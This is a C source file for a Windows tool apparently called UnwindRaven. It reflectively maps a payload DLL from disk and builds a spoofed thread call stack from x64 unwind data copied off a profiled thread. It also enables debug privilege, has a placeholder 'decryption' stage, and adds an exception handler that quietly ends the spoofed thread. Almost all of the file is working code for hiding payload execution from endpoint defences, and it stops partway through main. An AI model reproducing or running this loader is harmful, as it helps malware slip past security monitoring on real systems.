#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <dbghelp.h>
#include <winternl.h>
#include <stdio.h>

#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

typedef LONG NTSTATUS;
#define STATUS_SUCCESS            ((NTSTATUS)0x00000000L)

typedef BOOL (WINAPI* FnDllMain)(HINSTANCE, DWORD, LPVOID);
typedef void (WINAPI* FnRunTest)();

typedef union _UNWIND_CODE {
    struct {
        BYTE CodeOffset;
        BYTE UnwindOp : 4;
        BYTE OpInfo   : 4;
    };
    USHORT Op2;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    BYTE Version : 3;
    BYTE Flags   : 5;
    BYTE SizeOfProlog;
    BYTE CountOfCodes;
    BYTE FrameRegister : 4;
    BYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL      = 0,
    UWOP_ALLOC_LARGE      = 1,
    UWOP_ALLOC_SMALL      = 2,
    UWOP_SET_FPREG        = 3,
    UWOP_SAVE_NONVOL      = 4,
    UWOP_SAVE_NONVOL_FAR  = 5,
    UWOP_SAVE_XMM128      = 8,
    UWOP_SAVE_XMM128_FAR  = 9,
    UWOP_PUSH_MACHFRAME   = 10
} UNWIND_CODE_OPS;

#define UNW_FLAG_CHAININFO 0x4
#define RBP_OP_INFO        0x5

#define MAX_STACK_FRAMES   64
#define MAX_STACK_SIZE     0x3000

typedef struct _StackFrame {
    WCHAR targetDll[MAX_PATH];
    ULONG offset;
    ULONG totalStackSize;
    BOOL  requiresLoadLibrary;
    BOOL  setsFramePointer;
    PVOID returnAddress;
    BOOL  pushRbp;
    ULONG countOfCodes;
    ULONG pushRbpIndex;
} StackFrame;

typedef struct _StackProfileEntry {
    WCHAR   modulePath[MAX_PATH];
    char    functionName[64];
    ULONG   offsetFromExport;
    BOOL    needLoad;
    BOOL    hasOffset;
    DWORD64 absoluteAddress;
} StackProfileEntry;

typedef struct _ImageBaseEntry {
    WCHAR   dllPath[MAX_PATH];
    HMODULE hModule;
} ImageBaseEntry;

typedef struct _MappedImageInfo {
    PBYTE Base;
    BOOL  IsDll;
    DWORD EntryRva;
} MappedImageInfo;

static ImageBaseEntry g_ImageBaseCache[64];
static int g_CacheCount = 0;
static MappedImageInfo g_ImageInfo = {0};

/* -------------------- helpers -------------------- */

BOOL EnableDebugPrivilege(void)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        &hToken))
        return FALSE;

    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    CloseHandle(hToken);
    return TRUE;
}

HMODULE GetCachedImageBase(const WCHAR* dllPath)
{
    for (int i = 0; i < g_CacheCount; i++) {
        if (_wcsicmp(g_ImageBaseCache[i].dllPath, dllPath) == 0) {
            return g_ImageBaseCache[i].hModule;
        }
    }
    return NULL;
}

void CacheImageBase(const WCHAR* dllPath, HMODULE hModule)
{
    if (g_CacheCount < 64) {
        wcscpy_s(g_ImageBaseCache[g_CacheCount].dllPath, MAX_PATH, dllPath);
        g_ImageBaseCache[g_CacheCount].hModule = hModule;
        g_CacheCount++;
    }
}

DWORD GetRvaFromName(HMODULE hModule, const char* functionName)
{
    PBYTE base = (PBYTE)hModule;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS ntHeaders =
        (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY exportDirInfo =
        ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (exportDirInfo.Size == 0) {
        return 0;
    }

    PIMAGE_EXPORT_DIRECTORY exportDirectory =
        (PIMAGE_EXPORT_DIRECTORY)(base + exportDirInfo.VirtualAddress);

    PDWORD addressOfFunctions =
        (PDWORD)(base + exportDirectory->AddressOfFunctions);
    PDWORD addressOfNames =
        (PDWORD)(base + exportDirectory->AddressOfNames);
    PWORD addressOfNameOrdinals =
        (PWORD)(base + exportDirectory->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++) {
        char* currentName = (char*)(base + addressOfNames[i]);
        if (strcmp(currentName, functionName) == 0) {
            return addressOfFunctions[addressOfNameOrdinals[i]];
        }
    }
    return 0;
}

BOOL NormalizeModulePath(WCHAR* out, const WCHAR* in)
{
    WCHAR sysDir[MAX_PATH];
    if (!GetSystemDirectoryW(sysDir, MAX_PATH))
        return FALSE;

    const WCHAR* base = wcsrchr(in, L'\\');
    if (!base)
        return FALSE;

    swprintf_s(out, MAX_PATH, L"%s\\%s", sysDir, base + 1);
    return TRUE;
}

/* -------------------- unwind -------------------- */

NTSTATUS CalculateFunctionStackSize(
    PRUNTIME_FUNCTION pRuntimeFunction,
    DWORD64 ImageBase,
    StackFrame* stackFrame
)
{
    PUNWIND_INFO pUnwindInfo =
        (PUNWIND_INFO)(ImageBase + pRuntimeFunction->UnwindData);

    ULONG index = 0;

    while (index < pUnwindInfo->CountOfCodes) {
        ULONG unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        ULONG operationInfo   = pUnwindInfo->UnwindCode[index].OpInfo;

        switch (unwindOperation) {

        case UWOP_PUSH_NONVOL:
            stackFrame->totalStackSize += 8;
            if (operationInfo == RBP_OP_INFO) {
                stackFrame->pushRbp      = TRUE;
                stackFrame->countOfCodes = pUnwindInfo->CountOfCodes;
                stackFrame->pushRbpIndex = index;
            }
            break;

        case UWOP_ALLOC_SMALL: {
            ULONG size = (operationInfo * 8) + 8;
            stackFrame->totalStackSize += size;
            break;
        }

        case UWOP_ALLOC_LARGE: {
            index++;
            if (index >= pUnwindInfo->CountOfCodes) {
                break;
            }

            ULONG size = 0;

            if (operationInfo == 0) {
                USHORT low16 = pUnwindInfo->UnwindCode[index].Op2;
                size = (ULONG)low16 * 8;
            } else {
                USHORT low16 = pUnwindInfo->UnwindCode[index].Op2;
                index++;
                if (index >= pUnwindInfo->CountOfCodes) {
                    break;
                }
                USHORT high16 = pUnwindInfo->UnwindCode[index].Op2;
                size = ((ULONG)high16 << 16) | (ULONG)low16;
            }

            stackFrame->totalStackSize += size;
            break;
        }

        case UWOP_SAVE_NONVOL:
        case UWOP_SAVE_XMM128:
            index++;
            break;

        case UWOP_SAVE_NONVOL_FAR:
        case UWOP_SAVE_XMM128_FAR:
            index += 2;
            break;

        case UWOP_SET_FPREG:
            stackFrame->setsFramePointer = TRUE;
            break;

        case UWOP_PUSH_MACHFRAME:
            if (operationInfo == 1) {
                stackFrame->totalStackSize += 48;
            } else {
                stackFrame->totalStackSize += 40;
            }
            break;

        default:
            break;
        }

        index++;
    }

    if (pUnwindInfo->Flags & UNW_FLAG_CHAININFO) {
        ULONG countOfCodes = pUnwindInfo->CountOfCodes;
        ULONG alignedSlots = (countOfCodes + 1) & ~1;

        PRUNTIME_FUNCTION pChainedRuntimeFunction =
            (PRUNTIME_FUNCTION)&pUnwindInfo->UnwindCode[alignedSlots];

        return CalculateFunctionStackSize(
            pChainedRuntimeFunction,
            ImageBase,
            stackFrame
        );
    }

    stackFrame->totalStackSize += 8;
    return STATUS_SUCCESS;
}

NTSTATUS CalculateFunctionStackSizeWrapper(StackFrame* stackFrame)
{
    DWORD64 ImageBase = 0;
    PRUNTIME_FUNCTION pRuntimeFunction =
        RtlLookupFunctionEntry((DWORD64)stackFrame->returnAddress,
                               &ImageBase,
                               NULL);

    if (!pRuntimeFunction) {
        stackFrame->totalStackSize   = 8;
        stackFrame->pushRbp          = FALSE;
        stackFrame->setsFramePointer = FALSE;
        stackFrame->countOfCodes     = 0;
        stackFrame->pushRbpIndex     = 0;
        return STATUS_SUCCESS;
    }

    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase, stackFrame);
}

/* -------------------- module / symbol -------------------- */

HMODULE ModuleFromAddress(HANDLE hProcess, DWORD64 addr, WCHAR* outPath)
{
    HMODULE mods[1024];
    DWORD needed = 0;

    if (!EnumProcessModules(hProcess, mods, sizeof(mods), &needed))
        return NULL;

    int count = needed / sizeof(HMODULE);

    for (int i = 0; i < count; i++) {
        MODULEINFO mi = {0};
        if (!GetModuleInformation(hProcess, mods[i], &mi, sizeof(mi)))
            continue;

        DWORD64 base = (DWORD64)mi.lpBaseOfDll;
        DWORD64 end  = base + mi.SizeOfImage;

        if (addr >= base && addr < end) {
            if (outPath)
                GetModuleFileNameExW(hProcess, mods[i], outPath, MAX_PATH);
            return mods[i];
        }
    }
    return NULL;
}

/* -------------------- profiling -------------------- */

BOOL IsProcessWow64(HANDLE hProcess, BOOL* pIsWow64)
{
    *pIsWow64 = FALSE;

    BOOL bWow = FALSE;
    if (!IsWow64Process(hProcess, &bWow))
        return FALSE;

    *pIsWow64 = bWow;
    return TRUE;
}

int ProfileThreadToBlueprint(DWORD pid, DWORD tid, StackProfileEntry* out, int maxEntries)
{
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
                                  PROCESS_VM_READ,
                                  FALSE,
                                  pid);
    HANDLE hThread = OpenThread(THREAD_GET_CONTEXT |
                                THREAD_SUSPEND_RESUME |
                                THREAD_QUERY_INFORMATION,
                                FALSE,
                                tid);

    if (!hProcess || !hThread)
        return 0;

    BOOL isWow64 = FALSE;
    IsProcessWow64(hProcess, &isWow64);

    SuspendThread(hThread);

    CONTEXT ctx = {0};
    STACKFRAME64 sf = {0};

    if (!isWow64) {
        ctx.ContextFlags = CONTEXT_FULL;
        if (!GetThreadContext(hThread, &ctx)) {
            ResumeThread(hThread);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return 0;
        }

        sf.AddrPC.Offset    = ctx.Rip;
        sf.AddrPC.Mode      = AddrModeFlat;
        sf.AddrFrame.Offset = ctx.Rbp;
        sf.AddrFrame.Mode   = AddrModeFlat;
        sf.AddrStack.Offset = ctx.Rsp;
        sf.AddrStack.Mode   = AddrModeFlat;
    } else {
        WOW64_CONTEXT wctx = {0};
        wctx.ContextFlags = WOW64_CONTEXT_FULL;
        if (!Wow64GetThreadContext(hThread, &wctx)) {
            ResumeThread(hThread);
            CloseHandle(hThread);
            CloseHandle(hProcess);
            return 0;
        }

        sf.AddrPC.Offset    = wctx.Eip;
        sf.AddrPC.Mode      = AddrModeFlat;
        sf.AddrFrame.Offset = wctx.Ebp;
        sf.AddrFrame.Mode   = AddrModeFlat;
        sf.AddrStack.Offset = wctx.Esp;
        sf.AddrStack.Mode   = AddrModeFlat;
    }

    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS);
    SymInitialize(hProcess, NULL, TRUE);

    int count = 0;

    while (StackWalk64(isWow64 ? IMAGE_FILE_MACHINE_I386 : IMAGE_FILE_MACHINE_AMD64,
                       hProcess,
                       hThread,
                       &sf,
                       isWow64 ? NULL : &ctx,
                       NULL,
                       SymFunctionTableAccess64,
                       SymGetModuleBase64,
                       NULL))
    {
        if (count >= maxEntries)
            break;

        DWORD64 addr = sf.AddrPC.Offset;
        if (!addr) break;

        WCHAR modPath[MAX_PATH] = {0};
        HMODULE hMod = ModuleFromAddress(hProcess, addr, modPath);
        if (!hMod) continue;

        char symBuf[sizeof(SYMBOL_INFO) + 256] = {0};
        PSYMBOL_INFO sym = (PSYMBOL_INFO)symBuf;
        sym->SizeOfStruct = sizeof(SYMBOL_INFO);
        sym->MaxNameLen   = 255;

        DWORD64 disp = 0;
        if (!SymFromAddr(hProcess, addr, &disp, sym))
            continue;

        wcscpy_s(out[count].modulePath, MAX_PATH, modPath);
        strcpy_s(out[count].functionName, sizeof(out[count].functionName), sym->Name);
        out[count].offsetFromExport = (ULONG)disp;
        out[count].needLoad         = FALSE;
        out[count].hasOffset        = TRUE;
        out[count].absoluteAddress  = addr;

        count++;
    }

    SymCleanup(hProcess);
    ResumeThread(hThread);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return count;
}

/* -------------------- dynamic stack -------------------- */

void BuildDynamicStack(
    const StackProfileEntry* blueprint,
    int blueprintSize,
    StackFrame* outStack,
    int* outFrameCount
)
{
    *outFrameCount = 0;

    for (int i = 0; i < blueprintSize; i++) {
        WCHAR normalized[MAX_PATH];
        if (!NormalizeModulePath(normalized, blueprint[i].modulePath))
            continue;

        HMODULE hMod = GetCachedImageBase(normalized);
        if (!hMod) {
            hMod = GetModuleHandleW(normalized);
            if (!hMod || blueprint[i].needLoad) {
                hMod = LoadLibraryW(normalized);
            }
            if (hMod) {
                CacheImageBase(normalized, hMod);
            }
        }

        if (!hMod) {
            continue;
        }

        DWORD64 funcAddr = blueprint[i].absoluteAddress;

        if (!funcAddr) {
            FARPROC pFunc = GetProcAddress(
                hMod,
                blueprint[i].functionName
            );

            if (pFunc) {
                funcAddr = (DWORD64)pFunc +
                           (DWORD64)blueprint[i].offsetFromExport;
            } else {
                DWORD funcRva = GetRvaFromName(hMod, blueprint[i].functionName);
                if (funcRva == 0) {
                    continue;
                }
                funcAddr = (DWORD64)((PBYTE)hMod + funcRva +
                                     blueprint[i].offsetFromExport);
            }
        }

        StackFrame* frame = &outStack[*outFrameCount];
        memset(frame, 0, sizeof(StackFrame));

        wcscpy_s(frame->targetDll, MAX_PATH, normalized);
        frame->offset              = (ULONG)(funcAddr - (DWORD64)hMod);
        frame->requiresLoadLibrary = blueprint[i].needLoad;
        frame->returnAddress       = (PVOID)funcAddr;

        if (STATUS_SUCCESS == CalculateFunctionStackSizeWrapper(frame)) {
            (*outFrameCount)++;
        }
    }
}

void PushToStack(CONTEXT* context, ULONG64 value)
{
    context->Rsp -= sizeof(ULONG64);
    *(ULONG64*)(context->Rsp) = value;
}

void InitializeFakeThreadState(
    CONTEXT* context,
    StackFrame* targetCallStack,
    int frameCount
)
{
    ULONG64 childSp = 0;
    BOOL bPreviousFrameSetUWOP_SET_FPREG = FALSE;

    PushToStack(context, 0); // sentinel

    for (int i = frameCount - 1; i >= 0; i--) {
        StackFrame* sf = &targetCallStack[i];

        if (bPreviousFrameSetUWOP_SET_FPREG && sf->pushRbp) {
            ULONG diff = sf->countOfCodes - sf->pushRbpIndex;
            ULONG tmpStackSizeCounter = 0;

            for (ULONG j = 0; j < diff; j++) {
                PushToStack(context, 0);
                tmpStackSizeCounter += 8;
            }

            PushToStack(context, childSp);

            context->Rsp -= (sf->totalStackSize - (tmpStackSizeCounter + 8));
            *(ULONG64*)(context->Rsp) = (ULONG64)sf->returnAddress;

            bPreviousFrameSetUWOP_SET_FPREG = FALSE;
        } else {
            context->Rsp -= sf->totalStackSize;
            *(ULONG64*)(context->Rsp) = (ULONG64)sf->returnAddress;
        }

        if (sf->setsFramePointer) {
            childSp = context->Rsp + 8;
            bPreviousFrameSetUWOP_SET_FPREG = TRUE;
        }
    }
}

/* -------------------- loader / PE mapping -------------------- */

PBYTE ReadPayloadFile(const char* filePath, PDWORD pFileSize)
{
    HANDLE hFile = CreateFileA(filePath,
                               GENERIC_READ,
                               FILE_SHARE_READ,
                               NULL,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE) return NULL;

    DWORD size = GetFileSize(hFile, NULL);
    if (size == 0 || size == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        return NULL;
    }

    PBYTE buffer = (PBYTE)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, buffer, size, &bytesRead, NULL) || bytesRead != size) {
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return NULL;
    }

    CloseHandle(hFile);
    *pFileSize = size;
    return buffer;
}

PVOID GetLocalProcAddressManual(PBYTE pBase, const char* funcName)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
    IMAGE_DATA_DIRECTORY exportDataDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

    if (exportDataDir.VirtualAddress == 0 || exportDataDir.Size == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportDataDir.VirtualAddress);
    DWORD* pNames = (DWORD*)(pBase + pExportDir->AddressOfNames);
    WORD* pOrdinals = (WORD*)(pBase + pExportDir->AddressOfNameOrdinals);
    DWORD* pFunctions = (DWORD*)(pBase + pExportDir->AddressOfFunctions);

    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* currentName = (char*)(pBase + pNames[i]);
        if (strcmp(funcName, currentName) == 0) {
            WORD ordinal = pOrdinals[i];
            return (PVOID)(pBase + pFunctions[ordinal]);
        }
    }
    return NULL;
}

BOOL ResolveImageImports(PBYTE pDestBase, PIMAGE_NT_HEADERS pNtHeaders)
{
    IMAGE_DATA_DIRECTORY importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (importDir.VirtualAddress == 0 || importDir.Size == 0) return TRUE;

    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pDestBase + importDir.VirtualAddress);

    while (pImportDesc->Name != 0) {
        char* dllName = (char*)(pDestBase + pImportDesc->Name);
        HMODULE hDependency = LoadLibraryA(dllName);
        if (!hDependency) return FALSE;

        PIMAGE_THUNK_DATA pIAT = (PIMAGE_THUNK_DATA)(pDestBase + pImportDesc->FirstThunk);
        DWORD lookupThunkRVA = pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk;
        PIMAGE_THUNK_DATA pINT = (PIMAGE_THUNK_DATA)(pDestBase + lookupThunkRVA);

        while (pIAT->u1.Function != 0) {
            PVOID pFuncAddress = NULL;

            if (IMAGE_SNAP_BY_ORDINAL(pINT->u1.Ordinal)) {
                WORD ordinal = IMAGE_ORDINAL(pINT->u1.Ordinal);
                pFuncAddress = (PVOID)GetProcAddress(hDependency, (LPCSTR)ordinal);
            } else {
                PIMAGE_IMPORT_BY_NAME pImportName = (PIMAGE_IMPORT_BY_NAME)(pDestBase + pINT->u1.AddressOfData);
                pFuncAddress = (PVOID)GetProcAddress(hDependency, (LPCSTR)pImportName->Name);
            }

            if (!pFuncAddress) return FALSE;

            pIAT->u1.Function = (ULONG_PTR)pFuncAddress;
            pIAT++;
            pINT++;
        }
        pImportDesc++;
    }
    return TRUE;
}

void TuneSectionPermissions(PBYTE pDestBase, PIMAGE_NT_HEADERS pNtHeaders)
{
    WORD sectionCount = pNtHeaders->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    printf("[*] Adjusting mapped section permissions to strict values...\n");

    for (WORD i = 0; i < sectionCount; i++) {
        if (pSection->SizeOfRawData == 0) {
            pSection++;
            continue;
        }

        PVOID pSectionAddress = pDestBase + pSection->VirtualAddress;
        DWORD sectionSize = pSection->SizeOfRawData;
        DWORD newProtect = PAGE_NOACCESS;
        DWORD oldProtect = 0;

        if (pSection->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE)
                newProtect = PAGE_EXECUTE_READWRITE;
            else if (pSection->Characteristics & IMAGE_SCN_MEM_READ)
                newProtect = PAGE_EXECUTE_READ;
            else
                newProtect = PAGE_EXECUTE;
        } else {
            if (pSection->Characteristics & IMAGE_SCN_MEM_WRITE)
                newProtect = PAGE_READWRITE;
            else if (pSection->Characteristics & IMAGE_SCN_MEM_READ)
                newProtect = PAGE_READONLY;
        }

        printf("    -> Section: %-8s | Flag: 0x%08X -> Applied Protect: 0x%02X\n",
               pSection->Name, pSection->Characteristics, newProtect);

        VirtualProtect(pSectionAddress, sectionSize, newProtect, &oldProtect);
        pSection++;
    }
}

PBYTE RunRestorationPipeline(PBYTE pRawFile, DWORD size)
{
    printf("[*] Entering Restoration Pipeline phase.\n");

    PBYTE pDecryptedBuffer = (PBYTE)VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDecryptedBuffer) return NULL;

    memcpy(pDecryptedBuffer, pRawFile, size);

    printf("[+] Restoration complete. Stream memory buffer decrypted successfully.\n");
    return pDecryptedBuffer;
}

void DumpSyntheticStack(const StackFrame* targetCallStack, int frameCount)
{
    printf("[*] Synthetic stack profile (%d frames):\n", frameCount);
    for (int i = 0; i < frameCount; i++) {
        const StackFrame* sf = &targetCallStack[i];
        printf("    [%02d] Module: %ws | Offset: 0x%08lX | Ret: 0x%p | StackSize: 0x%08lX\n",
               i,
               sf->targetDll,
               sf->offset,
               sf->returnAddress,
               sf->totalStackSize);
    }
}

BOOL ValidateAndMapPE(PBYTE pSourcePayload, DWORD sourceSize, MappedImageInfo* outInfo)
{
    if (!pSourcePayload || !outInfo) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSourcePayload;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSourcePayload + pDosHeader->e_lfanew);

    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE || pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Error: Buffer signature verification failed post-restoration.\n");
        return FALSE;
    }

    DWORD imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
    PBYTE pDestBase = (PBYTE)VirtualAlloc(NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pDestBase) return FALSE;

    printf("[+] Base allocated locally at: 0x%p\n", (void*)pDestBase);

    memcpy(pDestBase, pSourcePayload, pNtHeaders->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (pSection[i].SizeOfRawData == 0) continue;
        memcpy(pDestBase + pSection[i].VirtualAddress,
               pSourcePayload + pSection[i].PointerToRawData,
               pSection[i].SizeOfRawData);
    }

    ULONG_PTR delta = (ULONG_PTR)pDestBase - pNtHeaders->OptionalHeader.ImageBase;
    if (delta != 0) {
        IMAGE_DATA_DIRECTORY relocDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (relocDir.VirtualAddress != 0 && relocDir.Size > 0) {
            PIMAGE_BASE_RELOCATION pRelocBlock = (PIMAGE_BASE_RELOCATION)(pDestBase + relocDir.VirtualAddress);
            while (pRelocBlock->VirtualAddress != 0 && pRelocBlock->SizeOfBlock > 0) {
                DWORD entryCount = (pRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
                PWORD pEntries = (PWORD)((PBYTE)pRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
                for (DWORD i = 0; i < entryCount; i++) {
                    WORD type = pEntries[i] >> 12;
                    WORD offset = pEntries[i] & 0x0FFF;
#ifdef _WIN64
                    if (type == IMAGE_REL_BASED_DIR64)
                        *(ULONG_PTR*)(pDestBase + pRelocBlock->VirtualAddress + offset) += delta;
#else
                    if (type == IMAGE_REL_BASED_HIGHLOW)
                        *(DWORD*)(pDestBase + pRelocBlock->VirtualAddress + offset) += (DWORD)delta;
#endif
                }
                pRelocBlock = (PIMAGE_BASE_RELOCATION)((PBYTE)pRelocBlock + pRelocBlock->SizeOfBlock);
            }
        }
    }

    if (!ResolveImageImports(pDestBase, pNtHeaders)) {
        VirtualFree(pDestBase, 0, MEM_RELEASE);
        return FALSE;
    }

    TuneSectionPermissions(pDestBase, pNtHeaders);

    outInfo->Base     = pDestBase;
    outInfo->IsDll    = (pNtHeaders->FileHeader.Characteristics & IMAGE_FILE_DLL) != 0;
    outInfo->EntryRva = pNtHeaders->OptionalHeader.AddressOfEntryPoint;

    return TRUE;
}

/* -------------------- VEH -------------------- */

LONG CALLBACK VehCallback(PEXCEPTION_POINTERS ExceptionInfo)
{
    ULONG exceptionCode = ExceptionInfo->ExceptionRecord->ExceptionCode;

    if (exceptionCode != STATUS_ACCESS_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;

    printf("[+] VEH Exception Handler called\n");
    printf("[+] Redirecting spoofed thread to RtlExitUserThread\n");

    ExceptionInfo->ContextRecord->Rip =
        (DWORD64)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
    ExceptionInfo->ContextRecord->Rcx = 0;

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* -------------------- spoofed thread entry -------------------- */

DWORD WINAPI SpoofedLoaderEntry(LPVOID lpParam)
{
    FnDllMain DllEntry = (FnDllMain)(g_ImageInfo.Base + g_ImageInfo.EntryRva);
    DllEntry((HINSTANCE)g_ImageInfo.Base, DLL_PROCESS_ATTACH, NULL);

    // Optional: log that the spoofed loader thread is about to park
    // (avoid CRT and stay minimal here).
    Sleep(INFINITE);
    return 0;
}

/* -------------------- main -------------------- */

int main(int argc, char* argv[])
{
    EnableDebugPrivilege();

    if (argc < 3) {
        printf("Usage:\n");
        printf("  UnwindRaven.exe --load-blueprint <blueprint.txt> <payload.dll>\n");
        return 0;
    }

    const char* payloadPath = argv[argc - 1];

    /* load blueprint */
    StackProfileEntry blueprint[MAX_STACK_FRAMES];
    int blueprintCount = 0;

    if (strcmp(argv[1], "--load-blueprint") == 0 && argc >= 4) {
        const char* bpPath = argv[2];

        FILE* f = NULL;
        if (fopen_s(&f, bpPath, "r") != 0 || !f) {
            printf("[-] Failed to open blueprint file.\n");
            return -1;
        }

        int count = 0;
        char line[512];

        while (fgets(line, sizeof(line), f) && count < MAX_STACK_FRAMES) {
            char module[260];
            char func[64];
            unsigned long offset;
            int needLoad;

            if (sscanf_s(line, "%259[^|]|%63[^|]|0x%lx|%d",
                         module, (unsigned)_countof(module),
                         func, (unsigned)_countof(func),
                         &offset,
                         &needLoad) == 4)
            {
                MultiByteToWideChar(CP_ACP, 0, module, -1,
                                    blueprint[count].modulePath, MAX_PATH);

                strcpy_s(blueprint[count].functionName,
                         sizeof(blueprint[count].functionName),
                         func);

                blueprint[count].offsetFromExport = (ULONG)offset;
                blueprint[count].needLoad         = needLoad ? TRUE : FALSE;
                blueprint[count].hasOffset        = TRUE;
                blueprint[count].absoluteAddress  = 0;

                count++;
            }
        }

        fclose(f);
        blueprintCount = count;
    } else {
        printf("[-] Unknown mode.\n");
        return -1;
    }

    /* build synthetic stack */
    printf("[!] Blueprint loaded (%d entries). Attach WinDbg now if you want to inspect.\n", blueprintCount);
    printf("    Press ENTER here to continue and build synthetic stack...\n");
    getchar();

    StackFrame targetCallStack[MAX_STACK_FRAMES];
    int frameCount = 0;

    BuildDynamicStack(blueprint,
                      blueprintCount,
                      targetCallStack,
                      &frameCount);

    if (frameCount == 0) {
        printf("[-] Error: Failed to resolve any frames.\n");
        return -1;
    }

    DumpSyntheticStack(targetCallStack, frameCount);

    // map DLL
    DWORD fileSize = 0;
    PBYTE pRawFile = ReadPayloadFile(payloadPath, &fileSize);
    if (!pRawFile) {
        printf("[-] Failed to read payload file.\n");
        return -1;
    }

    // decryption routine
    PBYTE pNormalizedPayload = RunRestorationPipeline(pRawFile, fileSize);
    VirtualFree(pRawFile, 0, MEM_RELEASE);

    if (!pNormalizedPayload) {
        printf("[-] Pipeline transformation layer failure.\n");
        return -1;
    }

    MappedImageInfo imgInfo = {0};
    BOOL success = ValidateAndMapPE(pNormalizedPayload, fileSize, &imgInfo);
    VirtualFree(pNormalizedPayload, 0, MEM_RELEASE);

    printf("[+] Processing complete. Status: %s\n", success ? "SUCCESS" : "FAILURE");

    if (!success || !imgInfo.Base || !imgInfo.IsDll || !imgInfo.EntryRva) {
        return -1;
    }

    g_ImageInfo = imgInfo;

    // register VEH so the synthetic chain can die gracefully
    PVOID vehHandle = AddVectoredExceptionHandler(1, VehCallback);
    if (!vehHandle) {
        printf("[-] Failed to register VEH.\n");
        return -1;
    }

    // create suspended thread with SpoofedLoaderEntry as the real entry
    DWORD dwThreadId = 0;
    HANDLE hThreadSpoof = CreateThread(
        NULL,
        0x100000,
        (LPTHREAD_START_ROUTINE)SpoofedLoaderEntry,
        NULL,
        CREATE_SUSPENDED,
        &dwThreadId);

    if (!hThreadSpoof) {
        printf("[-] Failed to create suspended thread (Error: %lu)\n",
               GetLastError());
        return -1;
    }

    printf("[+] Created suspended thread: %lu\n", dwThreadId);
    printf("[+] Initializing spoofed thread state...\n");

    CONTEXT ctx;
    RtlZeroMemory(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThreadSpoof, &ctx)) {
        printf("[-] GetThreadContext failed (Error: %lu)\n", GetLastError());
        CloseHandle(hThreadSpoof);
        return -1;
    }

    /* Do NOT overwrite Rbp – let the compiler’s prologue set it */
    /* Move Rsp *down* a bit to reserve space for the synthetic frames */
    /* Align Rsp to 16 bytes for x64 ABI */
